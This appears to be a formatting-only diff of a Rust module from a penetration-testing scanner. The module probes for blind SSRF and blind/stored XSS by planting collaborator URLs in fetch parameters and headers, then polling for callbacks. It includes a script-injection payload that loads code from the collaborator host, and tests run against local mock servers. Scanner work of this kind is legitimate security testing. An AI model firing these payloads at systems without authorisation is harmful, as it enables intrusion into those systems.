@@ -15,7 +15,10 @@ use std::time::Duration;
 
 pub const NAME: &str = "blind_oob";
 
-const FETCH_PARAMS: &[&str] = &["url", "uri", "link", "src", "callback", "webhook", "feed", "image", "img", "load", "next", "return", "dest", "target"];
+const FETCH_PARAMS: &[&str] = &[
+    "url", "uri", "link", "src", "callback", "webhook", "feed", "image", "img", "load", "next",
+    "return", "dest", "target",
+];
 
 const POLL_TIMEOUT: Duration = Duration::from_secs(6);
 const POLL_INTERVAL: Duration = Duration::from_secs(1);
@@ -39,8 +42,15 @@ pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
     Box::pin(run_impl(client, opts, POLL_TIMEOUT, POLL_INTERVAL))
 }
 
-async fn run_impl(client: &HttpClient, opts: &Opts, poll_timeout: Duration, poll_interval: Duration) -> Vec<Finding> {
-    let Some(collab) = opts.collaborator.clone() else { return Vec::new() }; // opt-in; silent when not configured
+async fn run_impl(
+    client: &HttpClient,
+    opts: &Opts,
+    poll_timeout: Duration,
+    poll_interval: Duration,
+) -> Vec<Finding> {
+    let Some(collab) = opts.collaborator.clone() else {
+        return Vec::new();
+    }; // opt-in; silent when not configured
     let method = opts.method.to_uppercase();
     let param = opts.param.clone();
     let mut out = Vec::new();
@@ -55,11 +65,20 @@ async fn run_impl(client: &HttpClient, opts: &Opts, poll_timeout: Duration, poll
     }
     params_to_try.extend(FETCH_PARAMS.iter());
     for p in params_to_try.into_iter().take(8) {
-        let req = if method == "GET" { HttpRequest::get().param(p, &pu) } else { HttpRequest::post().form_field(p, &pu) };
+        let req = if method == "GET" {
+            HttpRequest::get().param(p, &pu)
+        } else {
+            HttpRequest::post().form_field(p, &pu)
+        };
         let _ = client.request(req).await;
     }
     // also common SSRF-via-header sinks
-    for h in ["Referer", "X-Forwarded-For", "True-Client-IP", "X-Wap-Profile"] {
+    for h in [
+        "Referer",
+        "X-Forwarded-For",
+        "True-Client-IP",
+        "X-Wap-Profile",
+    ] {
         let _ = client.request(HttpRequest::get().header(h, &pu)).await;
     }
     planted.push(("blind SSRF (fetch params/headers)", ssrf_token));
@@ -74,7 +93,11 @@ async fn run_impl(client: &HttpClient, opts: &Opts, poll_timeout: Duration, poll
             format!("</textarea><script src={xu}></script>"),
         ];
         for pl in &xss_payloads {
-            let req = if method == "GET" { HttpRequest::get().param(p, pl) } else { HttpRequest::post().form_field(p, pl) };
+            let req = if method == "GET" {
+                HttpRequest::get().param(p, pl)
+            } else {
+                HttpRequest::post().form_field(p, pl)
+            };
             let _ = client.request(req).await;
         }
         planted.push(("blind/stored XSS", xss_token));
@@ -85,8 +108,13 @@ async fn run_impl(client: &HttpClient, opts: &Opts, poll_timeout: Duration, poll
         let hits = poll(&collab, &token, poll_timeout, poll_interval).await;
         if let Some(h) = hits.first() {
             out.push(
-                Finding::new(NAME, Severity::Critical, format!("Confirmed OOB interaction — {vector}"), format!("target contacted the collaborator ({} hit(s))", hits.len()))
-                    .with_evidence(format!("{} {} from {}", h.method, h.path, h.client)),
+                Finding::new(
+                    NAME,
+                    Severity::Critical,
+                    format!("Confirmed OOB interaction — {vector}"),
+                    format!("target contacted the collaborator ({} hit(s))", hits.len()),
+                )
+                .with_evidence(format!("{} {} from {}", h.method, h.path, h.client)),
             );
         } else if vector.starts_with("blind/stored XSS") {
             out.push(
@@ -102,7 +130,12 @@ async fn run_impl(client: &HttpClient, opts: &Opts, poll_timeout: Duration, poll
 /// then every `interval` until `timeout` elapses. Timeout/interval are
 /// parameters (not hardcoded) so tests can drive this in milliseconds
 /// instead of the real 6s/1s the production call site uses.
-async fn poll(collab: &str, token: &str, timeout: Duration, interval: Duration) -> Vec<pentest_collaborator::Hit> {
+async fn poll(
+    collab: &str,
+    token: &str,
+    timeout: Duration,
+    interval: Duration,
+) -> Vec<pentest_collaborator::Hit> {
     let deadline = std::time::Instant::now() + timeout;
     loop {
         if let Ok(hits) = pentest_collaborator::get_hits(collab, token).await {
@@ -126,7 +159,13 @@ mod tests {
     use std::sync::Arc;
 
     fn fast_client(base_url: String) -> HttpClient {
-        HttpClient::new(base_url, HttpClientConfig { delay: std::time::Duration::from_millis(0), ..HttpClientConfig::default() })
+        HttpClient::new(
+            base_url,
+            HttpClientConfig {
+                delay: std::time::Duration::from_millis(0),
+                ..HttpClientConfig::default()
+            },
+        )
     }
 
     async fn spawn_collaborator() -> String {
@@ -169,11 +208,17 @@ mod tests {
         })
         .await;
         let client = fast_client(target_base);
-        let opts = Opts { param: Some("url".to_string()), collaborator: Some(collab_base), ..Opts::default() };
+        let opts = Opts {
+            param: Some("url".to_string()),
+            collaborator: Some(collab_base),
+            ..Opts::default()
+        };
 
         let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;
 
-        assert!(findings.iter().any(|f| f.title.contains("Confirmed OOB interaction — blind SSRF")));
+        assert!(findings
+            .iter()
+            .any(|f| f.title.contains("Confirmed OOB interaction — blind SSRF")));
     }
 
     #[tokio::test]
@@ -181,11 +226,17 @@ mod tests {
         let collab_base = spawn_collaborator().await;
         let target_base = scripted_server(|_req, _| ScriptedResponse::ok("stored, thanks")).await;
         let client = fast_client(target_base);
-        let opts = Opts { param: Some("comment".to_string()), collaborator: Some(collab_base), ..Opts::default() };
+        let opts = Opts {
+            param: Some("comment".to_string()),
+            collaborator: Some(collab_base),
+            ..Opts::default()
+        };
 
         let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;
 
-        assert!(findings.iter().any(|f| f.title == "Blind XSS payload planted"));
+        assert!(findings
+            .iter()
+            .any(|f| f.title == "Blind XSS payload planted"));
         assert!(!findings.iter().any(|f| f.title.contains("Confirmed")));
     }
 
@@ -194,7 +245,11 @@ mod tests {
         let collab_base = spawn_collaborator().await;
         let target_base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
         let client = fast_client(target_base);
-        let opts = Opts { param: None, collaborator: Some(collab_base), ..Opts::default() };
+        let opts = Opts {
+            param: None,
+            collaborator: Some(collab_base),
+            ..Opts::default()
+        };
 
         let findings = run_impl(&client, &opts, FAST_TIMEOUT, FAST_INTERVAL).await;
 
